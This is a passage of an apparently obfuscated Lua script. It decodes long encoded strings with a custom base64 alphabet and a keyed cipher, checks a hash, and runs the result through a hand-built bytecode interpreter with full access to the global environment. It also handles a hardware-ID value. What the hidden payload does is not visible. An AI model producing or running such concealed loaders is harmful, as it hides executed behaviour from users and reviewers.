IN66crZhWdqQuFJN3x3kswXmUPTsds1QIdxR92marg9iApgn5fIVdiScsT7N36Pg_eH-5cgpGMEWHMzfqtgxifI8QSvynb6RAC-Kak3F-SODsRZ9Q23O-LcuQfnEyZC10ynzOs2W8ufW3reLXh4T07x5hD5hwTHqL0RBCv3OSPRQn_K7F2NCjuJpSlV1YDml5IdL1TPLZSJMHY9nw1wB2lSFZmC7FMW8j-qxfejCH3qeQip9c6DAB2JCM0DIWAuCce2aUTD7s5xBCzTaGocpM4iMV_zTNJlRr6hnA5bPs912xG0_iZzcwjLtyG14xncgYAFoz2uF3alDQrVBIvhrYT0uG8eR1Twm5t34KjkzuTMphhlTGAjdlvuuU3MXcRC_kFwpF4dzxyB4dkHuqtEC3DgOaf23SLTXSWbSNqDyFfnOcOV0c_xQ0JKe4lAZUu8Wng-4SyRRI7Zzi0eZpAt3y21f4SY8UPlTJAbsSUWZ9OQnuF0JFJdtmmSQ7myN3XmNqb7bF_d0YgGNMwSLNvo-OTTR7YQEFUqeJpX3OLwd35VfTovjS82YFbPanssitQI2viUb85mhhJxZ_Dn2TaHv8XlC_tR3NEK1UFTxlzVXvBQCEU_tnd8WQ0rKtxPAK-PazmXFDr3IadRTEcCXRsYKt7H1HjN5XpEB5FBrpYZEqhuv_UMPBrn0pet2FChl6RArQHc05udYOI6YNw0oMWN8XN0aJv2ZPMmJ2Folb7zpAc9vCCpV1NwTPXoCYpyS-x5ZEj0aTt63h7Teuma_LlrCKf-FnnClz_OnQ5C9uwJGRDk-GzUzAlRUigvi3CRMCNwjhHwf6wSh11zseQbN3hWrNTLhne7BE7a9K_Y8bLnJgYD3O7vBAzlxrI2Rp3fupS4fOfdVmiDSZZzxma4BTjpb5xBMzMokxn0Lee8RThcIsCN9yCUoxa4fOgQJUeZ1w2qOrIjXweBJBXOCDYUYY_GjKJySCzPKF07YaeI613AnKOQmE15rHfN7OYcQPytJsVsd3Tv4Qq7eSpxdo8I3mu5gac4EZqCjSvV-bSPCy-xW3px7mOBRNVw8QKxr_F2NfbWWWN2JtFNxHT11o3iCvn5mgMGQiXKo0ygiOXrNr8zI7L-GeWXyZAnJR_XKb7Uq9LaRZwBVrutjN7dsh62dkC4QctwEDP9R7vCM9rxHhyrGedeINW3YECFzv3r8GzIlkB_XewFVc5klMHBmqTjHHHYzLyUMkyYhHvIfHWX-fIxbC0Smsmfe8ei6icLsFo5JhtEmKXPWpGnesf_TGCIqYopr21jxtBPFlu96Gc0lOQFifGR1lCHM608bV9orbjDoDamWnvqzcJEHDMBnjMLWhCgyxfn1IvC8ggZHTH3RRTOIqdHwKCCaiM9BJjlzW5aOEke6qdOmhJEemaYJMHQES_fyVYrfa8tHOesXNaiDc8Vbtmx6N6xwBcjqUpUYcZ4o7QZl3TvYtkq3MF53Q3nnlGEoIy9QkOIDeLqEjf-OIFhbtngJB-UjMzAvaStck042qNd0KHrCUPxEwJU92VfcQ98dEmnuWxIceHZHRBz2MhJ9KvFsUaesFse7s711GxDXFzP7hEJa7DgqPTvf_3nODVvycpc7IsF3l4aWtpWbnNZSP7e2euZOxRGaO9oF-3CTRILS4Q-ilY_9nYla658fBLWT6UYatVcxDEHj3kmsjk7dfBIGSaoQD1Q7zBjVRY5Q0IJPP6z4MMq4l7I8yMepqoRsXnFOBkHmWCkEf1cp31xiqdWA_xsBXBh-kf48hWJytEy6t3qTsSXG2HxSl_zCAUgspU24CNSBMQNkWUS-aIiHgjsHc8yNEsB2s3rb_izu1BtDGIRscoq1bCiaslWAWpSAOYfqYdv5IF9nhLa_CIpul6IMDv0Zh7fRa6LiKbgaigidGmu18zFCn3NDTaE_vGq790ZGPu6wNBFKwJeIa16e0WlOHhdaQgkQqPgVIMcwUkffhf_e4-stuuNwHhdmVtu-kgmXEN-dbV7Cr3ja192QDOHpqdUmi_nbltoLTXNlt9_aZHQp_CIANYrPLso0Qj3owIYcSWt27ql1V0miL-djQlWVZsGjiGU8fNTVp8ErBlqrDlLsuLM6ek_AHfmh3OxHjOxn3dW3azXJmgRc3nWwsTr0xC3Nnv8WE4GYutpNzRZZZN8YH9suPvqZ4JRSuS65EmkC7xntTL0JXdmMEcuvdDxQ6y1TgmdjnSMK8YcYven1H08MxHk-_z1Va2K9T0AFrf1piQ4gOxSTOIS2oECiBAE1XYwoNLWqx-zYbeiljBy329XdpqxbGsYs1tbLgYgH8uIDm1xyyA4jWu_54QYFkXdXlMt7qu33zXNG8fdl6xrmNgTiFbM9AE9vsII-gfn2r4-d7Ij41RqCXvpYohZ1dwAyJEpSon6w99sSX9yRcUA28q7BIx7EJiBAY3w8vyU1Xt_gBvj7Bgy0HUwzYLPbFMlBBk186KXVk4TEy26mqLi2wzOuqA1lsIXeunnFHA0EY4CFiTQ2nKWlY53elxfLun4YDVEvBgGqhhiAzGnXKfuLeuqY2pwE9NTADJHlWJaYCvUemNGgkbYaq0wT_z6V1e1EkMbaYWrvylkboc80bmGbWuj0PBpqe2AEi01JSFwuAjxl91c8V0Y6cUytadSpwu-Oe2ibR6n2ifuDJTV1NEglz1H14s3DSnP_IwcLUkiZ_fVu3Zg28QX0DvCah8rfb4r4cD4LwqJ8oY0M35g9aEuhHWxbcwhj0Xu6XByNEVCRpFaPwmMdO_qDtTvGukk64c7mE2OC36DXt9J2oiMyKT_TySnT_P_i730iAMyJOtR-Pz-8bYdEihUo9O9Zg0KX6IAClsNzhfoblf-PLhIdcBRR9rGV2qa1w6YhHLsg4WtJ4Tr-iGCgllVOKtYkmm1_Z4MVrsNIyqeEnQYiNtr4aDaS4DipQtCaI23MeIRVm7qPjmwBUh_mxBU_5Cd4ajohCw2PCvLHk43yO-awe-FpSrpHRw22dNiPQp6qvzes4CjK_ht2EslvK79G7x5Z1ns7q2Ex_dfOpMoySMxTbx5tYOEcF5CQSrmgPd8eTEB8fY8cBAZioStUKSBrfIr6bQonO0iaF0MmBVCu39WJV61jvoJBduNHTI8SqIhueUnr_6l1YAz2ZgwXmSgfx8DBXyf2VDXIQvkUPvKbQFxerihmnM211UL3jc5dpWbOlZsQ1aNLH4KgTtyTr8lfN-MjzGd70vVYgjnYjtr7EW3uofUCfSG92tlfhpHgkthPa0ELWgL_qd6EsNRXRLdtZUwCvy3Di9ivo2zEP_Cx4YZas9MHNVxIbKI4NjZ1s93ipz77FrANqXHPMPD3zyg7KNyNf6SL3_dSGha3I8euriMjE05j533lHy3VhdEmQcv-i3ZjkklpL64_JXqAmX8ZNN5JON2ercoXaLi2h4jJWfKgtYvoizgxgmbx3U0xEZkQg8vYzI3m1KjwW53m-dA-JARRX3nJO57AyAyiVDaI1SjA1MRPkaA5M7PVqPCS0ehuPh55xNDyxOqF36NyHIJ9QHpODQjcpayslr8Kc_3YP-3dibxDAoCfsTo3GGbnoeElFgb5nLKAjG9GOe78d7Ewt70cVhD88yrdmuFjiuN-74aT7dQgfw2n5sknVdgt5Q8JJOFZ2zt8vIixYvxrnj9VgDHTkNL4k2YRtCWol7GFwJ71TkTW_UpJiId1XxGKgYVCD6RULyFdFvFtlqMYRlR96HOKVgcxQCcSa3qljX4EcLKP2Qnupw-NcUral5-SnFIlrBHwCgusCDl9VYz2_W71BHsBkE58aNDofqZDdFVtwF3uyj_c6ilPne9zhzlvyKRXUAcuOw4EMC3TpM84EhhqobO6TUivLnh_i7MtePasKVtPSlY2C10K7nwySLWEsDTBJA1d_XoxgTBsouj5Ojl0hFrH0ePqUzVsXecykLmk39Vz2RP0mvQjmCrcLS_1KOmPbJfC26Qgssjjh2RxsXZXZ4vGfBQc-hQ4jRuFSIkZKDGRLL2ZcxaxJz0c3EkqHBjsxzkVWU2Iey_L-ouURWVBIAjzSrW9UBtCIrzuLDNfw-xibTTj2KaeY4TXhS7pqlUR3QGiSpaLAYhB7-MgJW6CItlulSMitJXdAi_FyqniupvJA_P76KqmB4oPVjew62NGSWDoRMevM5F1qg1dMwsoFhIrg2G0yVKib9fdxa-eLRbbB-aIyJV9b3iGtRRDuqr4CkX-5MHefm5tO79srIwxTNwuDTJ6lCYouF62Ghc98HVH4fSndw3AH-OO8BshFLtLQr1u5dYzkyJA9EIL3BgEZ8lfKukXoNSQkIHaSeJ2cqXgZH1yk23I2FP1-si7A8RBHSV5mVqQ3XucpOB1HnLJfHomTeAxutWHEPbtDn8gZsvyCAOJikjscEJW3hS04qbhNzugWgsVMHoxqPqWnWpuwMt0uz-ou43HJ-nWp4zwRTWTT8jswSg6sSW5P28fTqMIAY06k5QpfSj1plVDIHwltuDUWGIGgE5DMgSktxWNAwF9DqiQsKn88wK2XvaZUGbCHQ9p1YAGyqOsR6-eILP98N-i2RxiuSLhMp0V13T83YEC7VHdqub4wQYSsd48dmrLzWPCfmoNfO9JhUDzLEmsfZnV3QvbC9Jb5IGuqWzbt_CfazrO6vv6pqt44IMW4ARwA2HE4cO3XjWmkAuQ5oBtWQJfTmlwk1FZjb2QVPMO2TCL4GI6ER5UlO6SBRPfvW-_6EfXWG9tKdTj2Tn4_sDbbCIizm3VsEJJobdd6AweNMPWaPBwDmGFKPU6ecqmvtntH9LcWZTnPFRdMfFQvQqUnSgyCUD-tPJ3u6iyPNOyLrt92qCO649oSz2_jnsYgvzmEUjuBBANHDqSQZ7Bajmf8z0yeSysX6y9CRoWizlCVIU_piuFxvnmh1B4IHB264QWPf59vk1F0ko9JWnv_Z3HgiUoRn38nY2XPjs7J37vJ14cxV1ZqhfHkBBKDAHr9YLYmsW07foB_GrvuVTB1NRibg2FtckfWay2sNGHp1VfROCnWT-7K4AMsbS6SWD4HHtSf9M0vTSsyogfGKnfznd8DTJfjp080-Oe02H_WH53RYoKCfMDMEDnBq9HuboifpiQEP3JcAtWg2mKA584I1pPkxsRWAdwh3yYqD0FsKRxOv0cxNFgMFrFXv8_Ra9lKqhlkbZB3ERqjilIzNJSdeNbE0JPDNDWAlMJ99Z-4s1Qofgi-gezWxqmBB9yFxGr-LGmzACjI3GSKs4PZyRAtoNNqwzQ6VLPh5Xi0T5tq-QKC98984jhxEBuGBErW3kYVNnSBm7WcIZTmzfr9KTBgmWW6MpfwhO0aZNtdH2cvBmLc9zSZxuFhVAm8bCAjOBJAqsdV3-Jm1LWYfWF-CdSvFpx2ojytl1FGx8U7BtWA6yMDeqbykYSlE0VAhwC_sc0xuPBQR5HCVrkvqIbf8yeEUNZV2126Nua9NewFGvbawJ81BCbqKMftXgpyh5t3q4_kJGcsW9hb34-DZIJ2jYnzttvDY9lkI08nfIvoNv1_HUjAPmdUf6M8xVXCHSohQr5MMmDTxkSl0_aTbgBT4rQBFXQr-WijZlz7RHS4A5_h-ieTDHZBX9Wu_RkzMb7hCAXqJipjvU4Bk0LWFS8NQGOb8f1zwHWP06fo6T1rdfSYaYHs2ToBXCIM7JCI7b8ujNctIUaP4XaoExhl93Di7AFfxwT3ZMx4kx2kDqbmS0PHqBZ5bBYZfOzilEJP4MC8Y7E80SHYJOxf3oQtkS1PXtMsA74kT7WKNo61Pm4OncL2ZDfnP9zG0rFp8qpZkq0Lq2WV1uDg4x70qpcNPs0THAlOab9Jmp4txejp-BL0U1pytBHG0MhLFTX4W6MPDqw94_hMd6VaPTxHMXBD4vhNSdTqP-656Be3X38FrLez1V-fLyRbrYw2d3oWWYD4JuwTwuHsPhge5pxhsPL8UrwQ9NCb6qEUhdfZWS2kJNm4eLSvV8iFDprLIJFRubhFk8nNOuihUGQCTm40k5GqmkiZhjz4cy-YoZpxkuwazs290I4EOfobq67KP18FfPHNA86vC5735JDPZBuIFE4Cl2fWFE8DgSTvwv0ywiDn6HOI2WdylB2ssiJ0p5CI3nksAygWRNIpPc7hf16QDTsvqb-FPaQE6Ye1w_exYfuu5606Fgy3EZ7G_1DvFQBtpuZ9xrbtKK4AKOH8PaIN5IhqJrscOxmKECKwXQtsR9NFkmc_L0aGe-78HwBE0ikU2SGHE7Z-XNgAp4GEPN9tP7lxCrf_ihexBWMLNjwPKk4sHRx8tc4qECdPa361tIRyDdNmHxyvIJt8w8U7tYEzOIOkhH",
("Hsu8GSdrlQNHE-Hu-PE3a6FnH6jmGSTgmdrEeWwdhEJbiQ9nq8ymAtb-NX9qrb_fzWFz_i0HY1TsXGUtsBfSai03eFRg3yiO9eeQt-zzicFgoCpcUxJE_u-mPkBNJwZHjAlWH768msvj2sED6zlq6dQl3FbN3X56c28MHrORWw6WwZYU6ptPTjdnZmRdYTeNKzn44_B-uLn1nUo-jQriei66yeM6uRe9Gpl9JEtfrPXAMfLYE2T7MuneELo9QTSm4prZ7jyQr4F-jUtdekC2pKMQ7kNQyasqdH5S0I2dJT3cuKQNv47SYKkJW32OcjpiyFA8fQQaK6b7jiqOTtojMRfBPnJFxiGOjxnMXYeZbn8qq0gWECMnTaxP-WupMkJras5Om_eTqa77WnNZ1F_yYLkspVuRzmODy2Zkz1DWv6yQW47aQVZtAySz6_-xV1rmBOaJVqg06OgKm9ary9RBgFqANVytzoxXVVFaaO97LduPeSltnJ5Cg-YLEjLXTY0Wz495U0HXpnhWRbOg0vNSp4Hn5-o-CFjYZNISjiU3DXoL2ftIy0iVZdlAS28HXQay0XWqTLWgYBI6uKYkyYOiOO5BmWJYMfKtmELfB3FA9g1BLT01mKeFzAJ8pgipJg-ck01ky9lhBiQlq4AEBwM_JU6xaSrhrJdFarh1onmToizFtCdkoaJSbO0lQ_On0uhYidprsc2nKCyXOozRZw9xivgHwLSrnTvAr3HiF4oULA5Wfl8TakBqzJ_vbgs9SEOSRV_yJ3jdhu9CCa63BK2wGqUH2FEWQTukZDXsNHXU_Aj0wbTzvHEOe6Uig3SR_TqYNqjoVJhxrtcHJzfhljzjE_XDe2WE7RLD4xGg0k_4wJ-J3Jcd8vm1t5KoSZr_qp4Wndn2OAW157e8SXvQCKhmLaZB7EXuMTawAHmKbdoqbJ7RKxfnMu8LMLpKHdTuneylt-vGsQwXB1FEJsbbfrTrSzSUxWEX30ajogMxhhHSd-ykisj8ifwmlaIkZnweI6BNxnLi8_F0rq_Lir_MstyooA8XKPQTI-eIRkAkT-WKK1i9szzitu_NvO7wcjxKT2KaMaSFgi18TTmjQJvRwU1DGYz2oQZKXl_OQ5AeLSYSq3QeCfBPRV3E604IAlNY6GCxiqwgv0bYnpWoFXTAPnU4TacFPOcrDmCDUuNKaP9ybmqVUmd_SF_BEBIhqYSSjlfFhZKvQPDlY63QOjjrRmGRH5enbnu6jodaq5ZkjcmPA6tWqdeiWp3W0Uqp1I3ayX0TASSgzeR_RDrZCMRJPlD-p559UZ0SSAkSkPTTI_ZqWGe33-Ot-MXj5jNMFZ6wODGh9mAibT7jzs3wD2I_m9wW6s8_hjAiVf_hR4AuAsRDfT35zfCFzoyj6-_l7dLUQ3kyGB9sjRtrEdOsgDa2JyxIf5gOQCxd2O1GtoaizZB_lu2VJrglopxu7_ygd4A_Y5vfhB-0HzLyuUZ03CkFEqsAwN437Koao7_yUmAjnaPBGU8jgKobxTTZ_wFdmeKZrU5H3tOIP9miH8jy8UVyF4LsOvGW4lXDxRdbRwpWc5_BRlf9LjZij8XmUsp04X8Q0fFwRi6OcBa4y7X7QVfKvwYf4H1iotAwNVshgjtc5xR9CsyCmdSkaI5oBNssV6HdURsdzvJDi85Vxfv5sXnwnjLcYS_p2IVsnP84FmZhos9tBwFF-SMWZCCYIO7bJTMlhGhJ7Mx1fM9zNRUulVcObMH7dFxpsJ59odp5kQ3JNkpija-TrwlUYvzaz2oCTdW-b48ve0F-4Xzu_pWGS34FjjvmYKlv-caIwUj9ZslM0H5bu7fs9Czx8IZt0i4swyyagMoQd1HCxhvneL8bBNHFvITSvRTrImYo3LXYQdyczo1B6rYLS-M_b29sXJ4G5JDdM1jRrTp7ZInPjHMCf1KiAjnF82ufYa9gDC2G4AML3qaGhvFBLS1l1S5_LKScWsUrlQ0AneKy4UZRymT7acI2lqEPLxnGJHSJVmLR-LQw1KYxpOnQQJVItymYK8RPxy9T96TL5dgQ4S2L-f57wryQn-lioj3oA4AkwKa8UR2pS1sNucKp98QkxYBDmdoQmAW8GUdi7WgR3Wk98EKIAvTpHNnBST9qnVWGozjj7ChzrLDPAfflYiNKj5D2zl4hVwvyGBipaItwYa4sPQz0UoTCV-Oqpy-4dOP9zr1MQU5Qk7Ef8DsLzQ_4Z6rPWtop0ABONRqHpFQmzr_R-mEd33u18af6VrtH6Bo2y8ltBpk".."mXmZHhrPw12U4B9QLbgs5kFVXh0gnFK218u9WVLVMZp0kbVWFMII1hCaRUYh9cKYgQdzQvg4asARRoA5q626K0GyLP3dsFydNRou_HMTrXgs4XmwDWVHH5-re3VQT8z8-fqTF0rl24YWoZfKGUcVQ0MUL4ZbJAPLVOsY7eGUF7mVTTrvHhSHT840ZInGaoeK5ydVZ7bgod4P8XZqKIoUam3dNVRqPMq8rmJXdQ_e3535ReUurXs4o2XWZMxgGNaS7IPfqOvgbLvWXjO25HtrNAFOR4fa4uG7tbBhpz7OYG-SxhJmvVtDnzupOYoBDvHwssIDE3ri7Y6TrLsbCNemAc_TxZyZsH0Nywkjr85AUUBRcwpQzh-alkAI-lPQE_AWK1ctEq2md6GjhZA8cO8fG4xmyjFxCobGjxNGq2SNONn5WVgdQ_Yg7w3kXCr5hIZ4T_fC6ZwBTJO4wTKVdXlY_VCWzsa0d2Z925DBObAMQ7QoOC_B0D0ind8H3vQW-aMD85bsGfxfy8oP49QUd5tWUdJ0xxvNmCMIcemtOquH20DtzqiG2sHLFSUAh4tjQ4y_tcmFy8myNyHjfUdEcQ6_Ols1rv0mhDSS1byWeQMx30Lg_IGBASyunA9072aX0Yg6oWPpPaQ477I36zOZ21fiB20Mc6mEj8WV6GruISypgLc23vnD1ed2USVCctqzBRV0keapNP6GrRbn_h7dg2JT75rGtoVyIDfQiIwbnTfx5e3CMykHvNwGWheWyt6iavRQPB3EceQI5Nx0GIXgZTA1YiuIl3ZrEsART1qCT1M6wkC8sgxlPsFc06-wZbk5JyTBeeNgs6XC-kenTYdsPZ3p4ZSqWPeTcoselMOEm6t88nKSne5uWPk98-5oMZ7WNWFBec95eTMK7NDlTErWXJMe0CPR-nymWFeFA0SltcKC6rk1KJV16P9u-h5z5FBKgS5bi0VIq3MBjEcPjTVa_X1n4Em-KgQMX8h8I37-TPwyDke2HxE_pqWt82HGze7CHQljzIwj-N8GSMDVJ7OY7jfas5fq7LqGQKfJCRPJ65HuAxZDnb2gQiz7DYHNNwFJjTEDvRsN_SbTh-25XSQdLhPQtxZf8PY60yV8vIU5y2fqZOsrGphKM7SdZElVf-ZHyEFtnhOCA0xQz7LxMBF5ReprgNrdwX1EnqKPVpohdKQxDGn6vYBIbrFEs1WX-pTTuXkTX80fCaI4SaF36KwDSjKLDAivBn05E-m_n24DKb2qzTJDyhH-Pmtb-k2-G1xjGZWNWwHPUiXv4Q6a68NYSGQQ1SMVumwO5tY-wuTZ-uW5g-7ErI6pcKhq4kUtpHkqZ7HDztZgyYFiS19ofYnqzEslhjiERRVf3XZ1W7P_e99BhyJS6w5pSzS38uceYBFTIcGSwI_4ynmycRgXkzJiqYd6JR1punszB2CM6U4zpZIWmKDANxD7O8D5bea6SzQ3gPYT3Y0Q98Kk4RjtoxiZtQeURgcb7wDNEXkj3UEoVRZOR8ktkvzTaRY1aEKBSSNUbsCxsBwhTRPv6z-FfuQuYG_wwyRKiVECsdnzx3tRrbiDwC5ndAA8VxkyiBO7zoHyZssfoojJz1XmdxuwadmRPZVh0tA-DPmREjx-sRzmnkMMyJEcbsJa4zaomGD1Yto8TAy4V1ReVgfvlzYnwV3uGDriEHczBmoo-27EaYoQwDmw1fdJr8q2qirwxb7DAuiYc1foEQOdANTEh3yRJ2rqfZHKg1G-VqnCs1JSJepVJoBAA4yTzQUFFH5AkWLcFeJVqdl_8LXzsRtyst_ucMoScTN--Aa4GI2dl6YNE4-K5j2bzt-ZAKr80e80EiUyN8uFD3ZImHq2ErLGuZ7RW6RZgwK99L6Z97H1AkHKS7ATNrQVjhPBVpHGg762gIY6nwjuBHjq19NrGlSI_34Kiy9mgP1g9J1aJeUgkzOW7aR1AM2s-gu9cyqczGyEbeXYy5so0F5uBm3oYBx5BistrMKjkZm2_L644YTdJneL1VnKBrZaxTJDLycToeUgEWIrzaA7qGdDeFF9x5_HRabfkjTHEGm-IdoxxYmXaSdklnBbutWcoHRSZKjB-Je4fQqZYV1QfndfTIdlaiaj36t4ZZ1EVJDGHjoiBU6uWzhPRtdTLYGlv4jc0qZbh7Iq4Bgst9H5RJzs7-J5WXt3VROLWhG5egqLpUCmV1nAp5j9dDOWuaK6N4-y4BgTxLX_hqLO6TJfCQddJhs9DVMwgpJSgPyXKhAXz0K73HsnSLlHhQM5BIpG8rs7uaDCclDbImeO61KvTSDKiFADwElQP7atmsk7GrXkV_5s9s-xriyAvtq7gZ33ysy9Uie_i0D0i2PjjbSIewT86CrxxFr3pJiiujY5Esu4fkGZNoeViUUAOwnRErNXjI3AcOU189hB6hsjDDtJtexIa8XqxTO-S9iLBlWspt2AgsPNqoSzLXr6SS8W8uGNw3MqQdT_2e59VwmI5xElObAVeZV5QbW_UMVWwB0erLobXNvugjHZC4sMiWSRt5pDgaoXycabw29nmlDzaLXZmExqzd-zcCjOEzpnNl5PMzZJldKhE3fVuaGlXREX4jruwTjzS3XJ0Yzf6G1hu7JpZbJg2yCf47KbQPw5iepu8WhBtPZX9dO03kbrSwF7Pdqex3_mDv1kUcOXD6iRL796-w2NawBJymxbWmwLBmPeG5W8TBEqCH5hVlAQaNwKOrtFVk7BiToI-Iyh8WccjohISxUbAhrwUFxDjMwA4WW7_CCcsv9TwoZJJNRypWAsxU5ftxdFse3TtmsYdPsk7JySQIEz--S5DXtYUhYWUrsKsd6HVQ_FMwBjM6ECaLw8nlM0UJ6bR1hoK_7W9hM1RkGZW_Mx3uY_FykkeGCORC8pTvgePFbLwdJxLxiquuAxnw4mhP-1YK8LeOuMcnZ3rNwGR50F3lIkSvF50P5TJufy6hOgho4z9bfv0H1-a6Nl9_biVgOvh905bhIfFHXjVuM26GgjcbZ3iBDYCAB92ojWo-IH8UPC83BNyiIJ_e_6jmFIj8EcAsVK71_BJp6AZ-KHCfwpyLP7bjIzWsConsAT4e4tbTpVLPGsLstSR9G7RBTODQdaohWQq0oeR_DGaBa4uuX4wNsPBx0OBFE02fQdUR7SwbX3VvPS9qOjNmndPEmP4_O3anp4u4FeDt9ngVtjFH5jVUky5A5NhjRtNy71pnGWmUaR1rm9I1kMJ4uBgtoUit0mmKfP9CmPvupGWobQbsR-zm-cbaj714UOLE59ECXXRkQHVO3c2tOf6febrUQO-6PNp6kM_HsLIkzviKAMlVeeGPc-gguft1ypzk85O77M1LBFLEAXZOsI1AgL5tehVnGVfy782e29UgNbTjH-FJIdGIbthyxolseTI70Z0Y6Cxyuyr39ytAWWaEbgakdyFcypkdsRL2h4niKCQNAQQ7rpOaGcqoxN1ejazTlENefkYppwTNR2mdMFbzB7qFcYV9oPFS-ydAuHhA_xWk7uDDrwGfqDIqpdUOmELzI_zWWmC23qzmZxBXzfG77u7bexy8SQpm9WP9d_z_ppHt7_erHxa3vk5pLXXmK5quPfcSXuohjH-X3R3aE2ehhWIgyDYooN5zyJT4IZFfCKIb4hpb7FYVpnW_JPLYSiC7IUGhSHSbl1YfbyFRaogdzTUeWsiHBqdonDk8XtcovEt7z4Ax-TGnNGukOxAR4iAy5ermy7hZCTyPDCC0VGj2366HutrouQ7W4wzxPRQ08Pc2VARqYaM2wZuUKgt3Sz65bwL_Vk1dplUaxUhLt312rJIsIqrbHqFluCvDc8ynrCJe7RT6CpeiWe0YyfgANGdc3bLPSMNKr9oAVSjZtz3ofoHsfgOn8DST84t4xeDcprxx36T8ZuEkBrs8AVpU4-nbB2Y6fOub1btZ5DxKld5LdNr4sbEd9yKQBtjPGN--cGY2L1Q7Evwqf0bCMfKKxwBEY4Ui7j2h8KeTdp6zqSnlgltyRL0nOjS3IaQpn5rPO3TSm8y4CBByjixUgDV9W2E3dY9H4q522GPTRapMiaZwH5xEoWbvoePqLH6HaLtOVNV-pxbEd1LEAem7neE_HpKra0uubZcw4RCVhyT2VpDgx8hy9tusYMOV_RppAS1YFY4CfnDLvFSBfBn2rFl4T323LC1K-i09PiQFtKRoiu4h9Ew_qBt2zZQm77AotA5s4Voc0RcExdWECvyu9OUy1xhWP2sTNOpoJQx-VFg99GhhstqGDFy0lQ09qa8vnZ7C3-MtgJeMzqTmAHFSKF1dzxz_YGZeyxUZmHOwzGen9BHAmEqJ6LuaSdxorxvAfavZcQE3DTdur7MIsQtuh1Qj-deiqJ1bSGDABEMmEpu47NyGTSJ82rZcwnEi63p1RCbHTd7DJfHMJH1QHWsRX9yPuidB9Q5rOEJANjbTMoxOGzgwg6x0KlMKlKbr4EFpnK3hTdmQlOXD65QnjFb4pVT5WyTSYfXOi7sLCYvm_Lq_8ItMLkpeRRGY2GwUCIMdKtsx-_MCs0J09Lkg8_b8eF2Mp6xH63EYGdUbi7Z1QRQ9cX-HCZ2kquiwlsZyZWJl21QzxHsw8KgOugKQP5eGCLQ6855Pv0eiJu22T_QYDOF3NLJzA5HxXWxGzkyAJ6ooZUR8MyyZQZzlfGVzwBQhX8uptaHNn13vkiqvlyDJv1sRH4ijf0JmiTTdX"),
}
local _a1d5={2,1,3}
local _896={} for i=1,#_a1d5 do _896[i]=_c7d[_a1d5[i]] end
local _6f,_d66=_701d(_d(table.concat(_896)))
if _d66~=2225923507 then error(string.char(52,50,56,49),0) end
local _a
pcall(function() if type(getfenv)=="function" then _a=getfenv(1) end end)
if type(_a)~="table" then pcall(function() _a=_ENV end) end
if type(_a)~="table" then _a=_G end
local _c207,_d9a0,_84ac=_cc(_6f)
local _2904=_ra(_c207,_a)
return _2904
end)()
end)()
if type(_bbfe5f)~="table" then return end
local hwid,_122891,_6238c5,_0175bc,_ce594e,_acedfa,_56fa8d,nap =
  _bbfe5f[1],_bbfe5f[2],_bbfe5f[3],_bbfe5f[4],_bbfe5f[5],_bbfe5f[6],_bbfe5f[7],_bbfe5f[8]
_bbfe5f=nil
_3ce362=(function()
return (function()
local _79={}
for _xfy=0,255 do _79[_xfy]=string.char(_xfy) end
local _764c={}
do
  local _t6y="fDF-ovl5Hk893PGWcUJeAq7nBSb1s2dhXuLCNxz4Y0_jOrigMIRZpt6VQwmyKETa"
  for _xfy=1,#_t6y do _764c[string.byte(_t6y,_xfy)]=_xfy-1 end
end
local function _f0a(s)
  local _avo,_nbd,_zwc,_fwk={},0,0,0
  for _xfy=1,#s do
    local _8ks=_764c[string.byte(s,_xfy)]
    if _8ks then
      _zwc=_zwc*64+_8ks
      _fwk=_fwk+6
      if _fwk>=8 then
        _fwk=_fwk-8
        local _bs9=2^_fwk
        _nbd=_nbd+1
        _avo[_nbd]=_79[math.floor(_zwc/_bs9)%256]
        _zwc=_zwc%_bs9
      end
    end
  end
  return table.concat(_avo)
end
local _73={}
do
  local _3ud="\155|\179w\244c\197\158\229+\029\031\222m$\2530\151o\143\232f\020j\241\242\019\000\136\025\211\173\144#\223\r`\249\174\240\207\234%S\213-@\248V\005\228=P\205.*\226\235b\152\206\184I9N\239\190\172\167\154\166\022q\196}i\185_\150\135\200\n\177e\"]\170\028\130J\140\156[R\171\153!\251g\2204\024\016E\217\210\191/k\201\230\127\224X1\161\163M<\007\164Z\238\139\149\015\018 \231\134\147\245\168\008p\003\160\19932\002\236\162(\009O\218rz\131\247\255\021dH\142C\017,)\182\132aTK\175\011\254\198\250{\209\181\214\225yv\157l\193\178^6\012nh\027\233s&\1338\189\169L\138\204\023G\030\183F?t\203\1875\180\202\192\212\252\194\208\246\219'\243\159\001\195\188\129\165\128\014u\004\141\\\148\221DQY\146\227\026B>\137x\237\215W:~\186\176\006;7A\145U\216"
  for _xfy=1,256 do _73[string.byte(_3ud,_xfy)]=_xfy-1 end
end
local function _2a1(S)
  local _lt0,_yfg=3952737025,46
  local _avo,_nbd,_ka5={},0,0
  local P=367621 A=-608629179 L=16631597
  local K={51,39,157,97,89,69,224,200,51,56,7,25,2,176,2,171,239,101,228,247,53,111,138,78,235,180,181,196,12,205,32,173}
  for _xfy=1,#S do
    _lt0=(P*_lt0+A)%4294967296
    local _4c0=string.byte(S,_xfy)
    local _gki=(_lt0%256+K[((_xfy-1)%32)+1]+((_xfy*113+L)%256)+_yfg)%256
    _yfg=_4c0
    local _bv4=(_73[_4c0]-_gki)%256
    _ka5=(_ka5*33+_bv4)%4294967296
    _nbd=_nbd+1
    _avo[_nbd]=_79[_bv4]
  end
  return table.concat(_avo),_ka5
end
local function _yn(_sv, _dx)
local _uq = table.unpack or unpack
local function _fs(...) return { n = select('#', ...), ... } end
local _qt
_qt = function(_aq, _lc, _mw)
local f5sm6w, _yu, f7k4x7 = _aq.f5sm6w, _aq.k, _aq.f7k4x7
local _iz = {}
local _rf = _aq.f8em35
for _po = 1, _rf do _iz[_po] = _lc[_po] end
local _iv, _tw = {}, 0
if _aq.f7kzbl then
local _af = _lc.n or #_lc
for _po = _rf + 1, _af do _tw = _tw + 1; _iv[_tw] = _lc[_po] end
end
local _ey = _aq.f2qjz + 8
local _pz = 1
while true do
local _ab = f5sm6w[_pz]
local _mh = f5sm6w[_pz + 1]
if _ab == 30 then
_iz[_mh] = _iz[f5sm6w[_pz + 2]]
_pz = _pz + 4
elseif _ab == 19 then
_iz[_mh] = _yu[f5sm6w[_pz + 2]]
_pz = _pz + 4
elseif _ab == 22 then
_iz[_mh] = _dx[_yu[f5sm6w[_pz + 2]]]
_pz = _pz + 4
elseif _ab == 28 then
local _xi = f5sm6w[_pz + 2]
local _ws = _iz[_xi]
if _xi >= 256 then _ws = _yu[_xi - 256] end
local _ik = f5sm6w[_pz + 3]
if _ik >= 256 then _ik = _yu[_ik - 256] else _ik = _iz[_ik] end
